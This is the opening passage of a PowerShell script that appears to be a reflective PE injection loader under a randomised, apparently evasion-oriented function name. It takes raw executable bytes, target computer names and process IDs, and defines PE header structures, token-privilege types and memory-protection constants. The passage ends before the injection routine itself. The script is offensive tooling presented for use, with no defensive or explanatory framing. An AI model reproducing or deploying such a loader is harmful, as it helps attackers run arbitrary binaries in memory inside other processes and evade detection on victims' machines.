
function Invoke-MESQNWEIQUYLFMW
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
